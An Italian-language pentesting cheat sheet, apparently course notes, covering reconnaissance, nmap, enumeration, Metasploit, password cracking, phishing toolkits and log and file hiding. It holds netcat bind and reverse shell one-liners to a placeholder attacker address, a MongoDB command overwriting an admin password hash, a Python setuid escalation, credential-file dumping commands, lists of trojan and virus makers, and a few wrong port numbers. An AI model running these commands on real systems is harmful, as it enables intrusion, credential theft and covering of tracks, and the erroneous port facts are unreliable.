# SITI UTILI - payload ed exploits
- https://github.com/swisskyrepo/PayloadsAllTheThings
- https://github.com/spaze/hashes
- https://book.hacktricks.wiki/en/index.html


# Porte Comuni:

> FTP - 20/21 in tcp
> ssh - 22 in tcp
> Telnet - 23 in tcp
> DNS - solitamente la 53 tcp/udp
> HTTP - 80, 8080 in tcp
> kerberos - 88 in tcp
> POP - 110 in tcp
> POP3 - 995 tcp
> NTP - 123 in UDP
> NetBIOS - 137, 138 in udp, oppure 139 in tcp
> LDAP - 389 tcp, 636 tcp (SSL)
> HTTPS - 443  
> SMB - 445 udp
> Active directory - 445 tcp
> SMTP - 465 tcp (SSL), 587 tcp 
> OpenVPN - 1194 tcp/udp
> Microsoft SQL Server - 1443  
> Microsoft SQL Monitor - 1434  
> MySQL o Maria DB - 3306  
> Microsoft RDP - 3389  
> PostgreSQL - 5631 tcp
> Traceroute - 33434  

# WEB FOOTPRINTING
## Google Advanced Search
La barra di ricerca di google permette di ricercare numerose informazioni semplicemente specificando delle keyword

> Alcuni dei comandi più utili sono:  
>
>> cache: mostra le pagine nella cache di google  
>> link: mostra pagine contenenti link alla pagine ricercata  
>> related: mostra pagine simili a quella ricercata  
>> info: stampa info riguardo il tito  
>> site: cerca su un determinato sito  
>> filetype: cercano determinati tipi di file  
>> allintitle / intitle: cercano le keyword nel titolo  
>> allinurl / inurl: cerca le keyword nell'url  
>> location: cerca informazioni per una specifica location  
>> allinanchor / inancor: cerca informazioni nelle ancore  


## Web Data Extractor Pro - Applicazione
Tool per estrarre tutti i dati da uno specifico sito web dato l'url di arrivo.

## WhoIs Domain Tools - Sito Web
> http://whois.domaintools.com  

Estrae dettagli utili sull'url specificato nel campo di ricerca della pagina, come dettagli sull'organizzazione, servers, IP, ecc...  
  
<br>
<br>
<br>
<br>
<br>


# NETWORK FOOTPRINTING AND SCANNING
## traceroute
Permette di tracciare tutti gli hop che vengono fatto da un pacchetto fino alla destinazione

WIndows:
> _ICMP_: tracert link.dom 
 
Linux: 
> _UDP_: traceroute link.dom  
> _TCP_: tcptraceroute link.dom


## NMap
Tool di scansione della rete molto efficace e con numerosissime opzioni e modalità di scan

> nmap ***[target ip]***  
>
> per un range di IP:  ***a.b.c.d1-d2*** (ip da a.b.c.d1 fino a ...d2)
>
> some options:
>> -sn: disables port scan  
>> -PR: ARP ping scan  
>> -PU: UDP Ping scan  
>> -PE: ICMP Echo Ping scan   
>> -PP: ICMP timestamp ping scan  
>> -PM: ICMP Address mask ping scan  
>> -PS: TCP SYN Ping scan  
>> -PA: TCP ACK Ping Scan  
>> -PO: Protocol Ping Scan  
>
> information options:
>> -sV: mostra info su servizi e versioni  
>> -sS: mostra info della scan TCP (solo syn, senza conferme)  
>> -sT: mostra info della scan TCP con connessioni  
>> -sC: usa script per ottenere ulteriori info  
>
> per le porte  
>> -p: per inserire una porta singola (-p 80) o un intervallo (-p 1-1000)  
>> --top-ports *n*: le *n* porte più usate 
>
> stealth mode  
>> --scan-delay *t*: delay tra le richieste successive   
>> -T*x*: *x* è un parametro da 0 a 5 e decide la velocità delle scan  
>> --datalenght *n*: padding aggiuntivo ai pacchetti per raggiungere una dimensione prestabilita  
>
> altri comandi
>> -O: rileva il sistema operativo in uso
>> -A: equivale a -O -sV -sC
>> --script _script_: esegue uno script specifico
>> --reason: shows a new column with REASON
>> -v: verbose, quindi aumenta i commenti e le info stampate
>
>> Can use numerous scripts used throught the tag ***--script=...***  
>> https://nmap.org/nsedoc/scripts/  



## MegaPing - Windows

Toolkit che aiuta a rilevare host vivi e le porte aperte di un sistema in una rete. Si può scansionare l'intera rete. Contiene numerosi tool utili per analisi di reti ecc...  

- ***Ip Scanner*** Permette di verificare quali host sono raggiungibili (e quindi attivi) e quali no dalla rete locale, in un determinato range 
- ***Port Scanner*** Permette di selezionare numerosi host e scansionarne le porte aperte

## Unicornscan - Linux
Command line network information gathering and reconnaissance tool. Asynchronous TCP and UDP port scanner and banner grabber.  

> unicornscan ***[ipaddress]***
>
> alcune opzioni sono:
>> -I: immediate mode
>> -v: verbose mode  

tips and tricks:
- se il ***TTL è 128***, probabilmente la macchina è un Windows Server
- se il ***TTL è 64***, la macchina è linux based

## Intercettazioni
### tcpdump
> sudo tcpdump -i eth0 443

### responder
> sudo responder -I eth0

## Protocolli vulnerabili a Sniffing
- telnet e Rlogin: keystrokes like usernames and passwords are sent in clear  
- HTTP: data is sent in clear text  
- POP: passwords and data are sent in clear text  
- IMAP: passwords and data are sent in clear text 
- SMTP and NNTP: passwords and data are sent in clear text   
- FTP: passwords and data are sent in clear text   


<br>
<br>
<br>
<br>
<br>

# ENUMERATION  


## robots.txt file
https://indirizzo/robots.txt


## NMAP
Come può essere usato per lo scan, è molto utile per l'enumeration delle porte aperte e di numerose altre informazioni su connettività e rete.

## gobuster

tool da terminale linux che serve per enumerare le porte di un server HTTP.

> alcuni tag utili:
>> --wordlist: serve per specificare la wordlist da usare per ricercare le directory

## git-dumper
tool per scaricare un eventuale repository esposta online

fare il check https://url/.git/ . se accessibile, allora usare il tool per scaricare tutto

- https://github.com/arthaud/git-dumper

> pip install git-dumper

> git-dumper http://ip/.git/ ./cartella_a_scelta


## NetBios Command Line Tool - Windows
Tool per effettuare enumerazione di rete.

> nbtstat  
>
>> -a [remote name]: mostra la NetBIOS name table del computer remoto  
>> -A [IP Address]: mostra la name table del computer remoto
>> -c: mostra i contenuti del NetBios name cache
>> -n: mostra i nomi registrati localmente da NetBIOS
>> -r: mostra il conteggio di tutti i nomi risolti tramite broadcast
>> -s: lista le tabelle di sessione NetBIOS convertendo IP di destinazione con i NetBios names.  

Comando per mostrare le informazioni sul target come stato di connessione, shared drive e informazioni di rete.
> net use

## NetBIOS Enumerator - Windows
Tool per enumerare una rete remota con informazioni su dominio, server ecc...

## sqlmap
Tool da terminale linux che permette facilmente di provare tutti i possibili attacchi di SQL injection in maniera automatica dato un sito.

il comando da lanciare è:
> sqlmap

alcune opzioni utili sono:
> --os-shell: prova ad ottenere l'accesso ad una shell remota, exploitando anche la vulnerabilità
> --cookie="COOKIE=VALORE": per impostare cookie come PHPSESSION
> --auth-type="...": con valori predefiniti, serve per impostare il tipo di auth da http header

## Metasploit
Initialize the DB:
> sudo msfdb reinit

Launch console
>  msfconsole

Check DB Connection
> db_status

Workspaces
> check which is used:
>> workspace  
>
> Create New WOrkspace
>> workspace -a nome_workspace
>
> Switch workspaces
>>  workspace default
>>  workspace nome_workspace

Enumerating:
> launch nmap - host discovery
>> db_nmap -sn \<target network\>
>
> enumerate services and vulns
>> db_nmap --script=vulners -O -sV \<target box\>
>
> list host, services and vulnerabilities:
>> hosts
>> services
>> vulns

Exploit:
> search available exploits for discovered services:
>> search _servizio\_vulnerabile_ _versione\_servizio_
> 
> sessions managing: once you exploited, you have a session.
>> ^Z - background the current session  
>> sessions - list active sessions  
>> sessions _n_ - switch to session _n_  
>> session -u _n_ - upgrade session _n_ to Meterpreter
>>
>


## Wappalyzer
Estenzione web che mostra tutte le componenti di una pagina e tutti i linguaggi di cui è composta


## netstat - Windows (non so se anche su linux)
permette di vedere tutte le connessioni attualmente attive su windows

> netstat -aon

<br>
<br>
<br>
<br>
<br>

# EXPLOITATION 
## FTP
Protocollo di trasferimento file aperto sulla porta ***21*** in ***tcp***.

Solitamente esiste un account senza password, con username ***anonymous***

## SMB
protocollo di connessione tra client, utilizzabile da terminale linux. Gira sulla porta ***445***

Comandi:
> smbclient: per utilizzare il client  
>
> alcuni tag:
>> -L _ip_: per listare le shared directory aperte su un ip.

## netcat (nc)
semplice utilità unix per leggere e scrivere dati attraverso connessioni sulla rete, usando TCP e UDP

tag utili:
> -e: configura un programma da eseguire alla connessione  
> -l: listen mode  
> -p port: specifica una porta locale   
> -u: UDP mode  
> -i secs: interval of seconds to wait  
> -v: verbose mode  
> -n: numeric only ip addresses (No DNS)  

tcp bind shell:
> sul pc vittima  
>> nc -e bash -lp 4444  
>> 
>> (oppure, se -e è disabilitato)
>> 
>> mkfifo fifo; nc -lp 4444 < fifo | bash > fifo
>
> sul pc attaccante  
>> nc victim_addr 4444

tcp reverse shell:
> sul pc vittima
>> nc -e bash attack_addr 4444  
>> 
>> (oppure, se -e è disabilitato)
>> 
>> mkfifo fifo; nc attack_addr 4444 < fifo | bash > fifo
>
> sul pc attaccante:  
>> nc -lp 4444  
>
 
## socat
-> da prendere info dalle slide di ETH 0x2

## telnet
per connettersi ad un ip su una porta specifica (utile se in ascolto con netcat)

## PsExec - SysInternal di Microsoft
permette remote code execution con username e password

> psexec \\\\10.1.1.1 -u username -p password -s cmd.exe

## MONGO DB
se si trova la porta utilizzata da mongo, si può exploitare

> mongo --port ... ace --eval "db.admin.find().forEach(printjson);"
>
> dove:
>> --port si connette alla porta (il default è 27017)
>> ace è il db_address
>> --eval serve per valutare i json di risposta

> db.admin.find().forEach(printjson);   -- stampa il json di ogni utente admin.
> nel flag x_shadows c'è l'hash della password.

Dopo aver trovato la pass dell'admin si può generare un hash dello stesso tipo con mkpasswd per poi sostituirlo con il comando:

> mongo --port ... ace --eval 'db.admin.update({"_id":ObjectId("id_trovato_prima")}, {$set:{"x_shadow":"nuovo hash password"}})'

## PYTHON
se python viene eseguito da root può essere sfruttato con librerie che accedono al sistema operativo

per aprire una shell 
> python3 -c "import pty;pty.spawn("/bin/bash")" 

per usare la shell da python
> import os
> os.setuid(0)  // se il binario di python ha il setuid abilitato si fa privex così
> os.system("shell commands")

<br>
<br>
<br>
<br>
<br>

# Password Cracking
Alcuni comandi utili per il processo di password cracking

- Linux:
  - creare file unico con username e passwords: 
    > unshadow /etc/passwd /etc/shadow \> target-file

- Windows:
  - password nel SAM trovabili nel %systemroot%\system32\config\SAM
    - bloccato finchè il sistema runna
    - trovabili anche nei registri: HKEY_LOCAL_MACHINE\SAM
  - windows 2000+ si trovano in active directory: %windiw%\WindowsDS\ntds.dit



## John The Ripper
> https://www.openwall.com

Tool da terminale linux che riesce a crackare le password dal file con gli hash (shadow)

si usa da terminale con il comando:
> john file_hash.txt

Comandi e opzioni utili:
> usare una wordlist 
>> john --wordlist=Passwords.txt target-file
>  
> stampare i risultati in un file, dopo la scansione:
>> john --show target-file \> results.txt

esiste una versione che riesce ad estrarre gli hash dagli zip per ottenerne le password:
> zip2john file.zip
>
> Questo comando restituisce gli hash. Reindirizzandolo in un file .txt si ottiene un file utilizzabile direttamente da johnTheRipper.

Comando per crackare hash dumpati dalla cache di windows:
> john -format:mscash hashs.txt

## mkpasswd
tool che permette di hashare le password con qualsiasi algoritmo. Utile per capire quale hash sta venendo usato

> mkpasswd -m sha-512 Password1234

solitamente i primi caratteri sono indicativi dell'hash utilizzato


## Cain
password recovery tool for windows. Can also be used for sniffing and password cracking.
Permette di trovare le password nei file delle password del sistema, nel tab "CRACKER"

> https://github.com/xchwarze/Cain

## Default Password lists
- https://open-sez.me 
- https://www.fortypoundhead.com 
- https://cirt.net 
- http://www.defaultpassword.us 
- https://www.routerpasswords.com 
- https://default-password.info

## L0phtCrack
Designated to audit passwords and recover applications. Recovers lost Windows passwords with hybrid attacks

Molto efficace anche su macchine in remoto, basta aver accesso ad un account su tanti e potersi connettere alla macchina

>  https://www.l0phtcrack.com


## ophcrack
Windows Password Cracker based on rainbow tables. Comes with GUI and runs on multiple platforms

> https://ophcrack.sourceforge.io 

## Rainbow Crack
Cracks hashes with rainbow tables attacks, using time-memory trade-off algorithm.

>  http://project-rainbowcrack.com 

## Altri Tools

- hashcat:  https://hashcat.net
- THC-Hydra: free to use on github
- Medusa: http://foofus.net
- pwdump
- Elcomsoft
- LCP

<br>
<br>
<br>
<br>
<br>

# MALWARES

## Trojan Horse Construction Kits:

- DarkHorse Trojan Virus Maker
- Trojan Horse Construction Kit
- Senna Spy Trojan Generator
- Batch Trojan Generator
- Umbra Loader - Botnet Trojan Maker
- Theef RAT Trojan
  - Written in DELPHI, Allows remote attackers access to the system via port 9871
  - La vittima deve avviare il server, il client poi si connette da remoto
- njRAT Trojan Maker:
  - crea eseguibile da far cliccare alla vittima

## Virus Maker Tools

- DELmE's Batch Virus Maker
- Bhavesh Virus Maker SKW
- Deadly Virus Maker
- SonicBat Barch Virus Maker
- TeraBIT Virus Maker
- Andreinick05's Batch Virus Maker
- JPS Virus Maker
  - pieno di opzioni d molto semplice da usare, interfaccia vecchia 
  
## Worm Makers
- INternet Worm Maker Thing
- Batch Worm generator
- C++ Worm Generator

<br>
<br>
<br>
<br>
<br>


# Social Engineering

## Social Engineering Toolkit: SET
is an open-source Python-Driven tool aimed at penetration testing around social engineering

> https://www.trustedsec.com 

## Other Social Engineering Tools

- SpeedPhish Framework (SPF): on github
- Gophish: https://getgophish.com
- King Phisher: on github
- LUCY: https://www.lucysecurity.com
- MSI Simple Phish: https://microsolved.com

## Phishing

tool utili per provare a fare phishing, tutti trovabili su github.

- **ShellPhish**: Tool da terminale che aiuta ad ottenere credenziali dai vari social network, come insta, faceboook, twitter ecc...
- **BlackEye**
- **PhishX**
- **Modlishka**
- **Trape**
- **Evilginx**

Alcuni tool utili per Contrastare il phishing sono:

- Anti Phishing Toolbars, come:
  - Netcraft: https://www.netcraft.com  
  - PhishTank: https://phishtank.com

## OnPhish

used to audit organization's security for phishing attacks using various phishing methods.

>  https://ohphish.eccouncil.org 


<br>
<br>
<br>
<br>
<br>

# Hiding Tracks

## Clearing logs

- Windows:
  - ElSave: command line tool per pulire i log, scritto per windows NT


## Hiding Files

- Windows:
  - aggiungere il bit "hide" ai file in modo da nasconderli  
    - > attrib +h filename
  - **alternate data streams (ADS)**: nascondere un file dentro un file
    - > echo "..." > original.txt:nascosto.txt
    - Usando l'utility cp (Posix).
      - > cp nc.exe oso001.009:nc.exe  \/\/per nascondere netcat
      - > cp oso001.009:nc.exe nc.exe \/\/per riottenere netcat
      - > start oso001.009:nc.exe \/\/per eseguire netcat nascosto
    - Per rimuovere ADS basta copiare il file in una partizione FAT e rispostarlo nella NTFS


# Priviledge Excalation

# Peas
Tool che scansione il sistema ed elenca tutte le possibili strade per ottenere priviledge excalation

- Windows:
  - WinPeas
- Linux:
  - LinPeas
